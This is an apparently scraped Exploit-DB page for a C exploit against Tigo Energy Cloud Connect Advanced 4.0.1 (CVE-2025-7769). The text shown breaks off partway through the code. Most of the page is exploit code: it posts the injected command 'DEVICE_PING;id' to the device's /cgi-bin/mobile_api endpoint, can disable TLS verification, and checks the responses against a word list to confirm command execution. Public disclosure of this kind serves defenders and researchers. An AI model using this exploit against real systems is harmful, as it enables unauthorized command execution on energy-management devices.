---
title: [remote] Tigo Energy Cloud Connect Advanced (CCA) 4.0.1 - Command Injection
url: https://www.exploit-db.com/exploits/52404
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:03.061971
---

# [remote] Tigo Energy Cloud Connect Advanced (CCA) 4.0.1 - Command Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Tigo Energy Cloud Connect Advanced (CCA) 4.0.1 - Command Injection

#### EDB-ID:

###### 52404

#### CVE:

###### [2025-7769](https://nvd.nist.gov/vuln/detail/CVE-2025-7769)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
/*
 * Title           : Tigo Energy Cloud Connect Advanced (CCA) 4.0.1 - Command Injection
 * Author       : Byte Reaper
 * CVE          : CVE-2025-7769
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "argparse.h"
#include <time.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#define FULL_URL  2500
#define POST_PAYLOAD   5500

const char *baseurl = NULL;
const char *cookies = NULL;
const char *ip = NULL;
const char *caFile = NULL;
int caS = 0;
const char *nameFileC = NULL;
int port = 0;
int uC  =0;
int verbose = 0;

void exitSyscall()
{
    __asm__ volatile
    (
        "mov $0x3C, %%rax\n\t"
        "xor %%rdi, %%rdi\n\t"
        "syscall\n\t"
        :
        :
        :"rax",
         "rdi"
    );
}

int checkLen(int len, char *buf, size_t bufcap)
{
    if (len < 0 || (size_t)len >= bufcap)
    {
        printf("\e[0;31m[-] Len is Long ! \e[0m\n");
        printf("\e[0;31m[-] Len %d\e[0m\n", len);
        exitSyscall();
        return 1;
    }
    else
    {
        printf("\e[0;34m[+] Len Is Not Long (%d).\e[0m\n",len);
        return 0;

    }
    return 0;
}
void nanoSleep(void)
{
    struct timespec ob;
    ob.tv_sec = 0;
    ob.tv_nsec = 500 * 1000 * 1000;

    __asm__ volatile
    (
    "mov $230, %%rax\n\t"
    "mov $1, %%rdi\n\t"
    "xor %%rsi, %%rsi\n\t"
    "mov %0, %%rdx\n\t"
    "xor %%r10, %%r10\n\t"
    "syscall\n\t"
    :
    : "r"(&ob)
    : "rax",
      "rdi",
      "rsi",
      "rdx",
      "r10",
      "memory"
    );
}
struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr,
                size_t size,
                size_t nmemb,
                void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitSyscall();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
const char *wordInjection[] =
{
	//Result ID
	"admin",
	"root",
	"groups=0",
	"gid=0",
	"uid=1000",
	"gid=1000",
	"groups=1000",
	"bluetooth",
	//Result ls
	".txt",
	".py",
	".php",
	".sh",
	".js",
	//Result pwd
	"home",
	"Documents",
	"Desktop",
	"Downloads",
	"Public",
	"Videos",
	NULL
};
void postRequest(const char *baseurl, const char *ip, int port)
{
	char full[FULL_URL];
	CURL *curl = curl_easy_init();
	CURLcode res;

	if (curl == NULL)
	{
		printf("\e[0;31m[-] Error Create Object CURL !\e[0m\n");
		printf("\e[0;31m[-] Check Connection ...\e[0m\n" );
		const char *googleIp = "142.251.37.46";
		printf("\e[0;31m[-] Ping Command (ip = %s)\e[0m\n", googleIp);
		const char *cP = "/bin/ping";
        	const char *av[]      = {
        					"ping",
        					"-c",
        					"5",
        					"google.com",
        					NULL
        				};
		const char *ep[] =
				{
					NULL
				};
		__asm__ volatile
		(
			"MOV $59, %%rax\n\t"
			"MOV %[cmd], %%rdi\n\t"
			"MOV %[argv], %%rsi\n\t"
			"MOV %[envp], %%rdx\n\t"
			"syscall\n\t"
			".1:\n\t"
			"MOV $0x3C, %%rax\n\t"
			"XOR %%rdi, %%rdi\n\t"
			"syscall\n\t"
			:
			: [cmd] "r" (cP),
			  [argv] "r" (av),
			  [envp] "r"(ep)
 			:"rax",
 			 "rdi",
 			 "rsi",
 			 "rdx"
		);
	}
	if (port != 0)
	{
		goto ipPT;
	}
	printf("\e[0;31m[-] Port Not Select.\n");
	if (ip)
	{
		unsigned  long ipformat ;
		ipformat = inet_addr(ip);
		if (ipformat == INADDR_NONE || ipformat == -1)
		{
			printf("\e[0;31m[-] Invalid IP address string.\e[0m\n");
			exitSyscall();
		}
		int lenIp = snprintf(full, sizeof(full),
						"http://%s/cgi-bin/mobile_api",
						ip);
	        if (checkLen(lenIp,full, sizeof(full)) == 1)
		{
			printf("\e[0;31m[-] Len FUll URL (IP) Is Long !\e[0m\n");
			printf("\e[0;31m[-] Len : %d\n",lenIp);
			exitSyscall();
		}
		goto done;
		ipPT:

			printf("\e[0;36m[+] PORT : %d\e[0m\n", port);
			int lenIpPT = snprintf(full, sizeof(full),
						"http://%s:%d/cgi-bin/mobile_api",
						ip,
						port);
			if (checkLen(lenIpPT,full, sizeof(full)) == 1)
			{
				printf("\e[0;31m[-] Len FUll URL (IP And Port) Is Long !\e[0m\n");
				printf("\e[0;31m[-] Len : %d\e[0m\n",lenIpPT);
				exitSyscall();
			}

	}
	else if (baseurl != NULL)
	{
		int lenUrl = snprintf(full, sizeof(full), "%s/cgi-bin/mobile_api", baseurl);
		if (checkLen(lenUrl,full, sizeof(full)) == 1)
		{
			printf("\e[0;31m[-] Len FUll URL (URL and EndPoint) Is Long !\e[0m\n");
			printf("\e[0;31m[-] Len : %d\e[0m\n",lenUrl);
			exitSyscall();
		}

	}
	printf("\e[0;36m[+] Final Full URL Format : %s\e[0m\n", full);
	printf("\e[0;36m[+] Preparation POST Payload...\e[0m\n");
	printf("\e[0;36m[+] Command Payload Injection (cmd = id)\e[0m\n");
	char post[POST_PAYLOAD];

	snprintf(post,
			sizeof(post),
			"{\n\t\"cmd\": \"DEVICE_PING;id\",\n\t\"dev\": 2,\n\t\"ver\": 1 \n}");
	printf("\e[0;34m[+] POST DATA : \n%s\n", post);

	struct Mem rS;
	rS.buffer = NULL;
	rS.len = 0;
	done :
		if (curl)
		{
			curl_easy_setopt(curl, CURLOPT_URL, full);

			if (uC)
			{
			    curl_easy_setopt(curl,
				             CURLOPT_COOKIEFILE,
				             cookies);
			    curl_easy_setopt(curl,
				             CURLOPT_COOKIEJAR,
				             cookies);

			}
			curl_easy_setopt(curl,
				CURLOPT_POST,
				1L);
			curl_easy_setopt(curl,
				CURLOPT_POSTFIELDS,
				post);
			curl_easy_setopt(curl,
				CURLOPT_POSTFIELDSIZE,
				(long)strlen(post));

			curl_easy_setopt(curl,
				         CURLOPT_ACCEPT_ENCODING,
				         "");
			curl_easy_setopt(curl,
				         CURLOPT_FOLLOWLOCATION,
				         1L);
			curl_easy_setopt(curl,
				         CURLOPT_WRITEFUNCTION,
				         write_cb);
			curl_easy_setopt(curl,
				         CURLOPT_WRITEDATA,
				         &rS);
			curl_easy_setopt(curl,
				         CURLOPT_CONNECTTIMEOUT,
				         5L);
			nanoSleep();
			curl_easy_setopt(curl,
				         CURLOPT_TIMEOUT,
				         10L);
			if (caS)
			{
				curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
				curl_easy_setopt(curl, CURLOPT_CAINFO, caFile);

			}
			else
			{
				curl_easy_setopt(curl,
				         CURLOPT_SSL_VERIFYPEER,
				         0L);
				curl_easy_setopt(curl,
						 CURLOPT_SSL_VERIFYHOST,
						 0L);
			}

			if (verbose)
			{
			    printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
			    curl_easy_setopt(curl,
				             CURLOPT_VERBOSE,
				             1L);
			}
			struct curl_slist *headers = NULL;
			headers = curl_slist_append(headers,
				              "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0)");
			headers = curl_slist_append(headers,
				              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			if (ip)
			{
				char headerHost[150];
				int lenH = snprintf(headerHost, sizeof(headerHost), "Host: %s", ip);
				if (checkLen(lenH,headerHost, sizeof(headerHost)) == 1)
				{
					printf("\e[0;31m...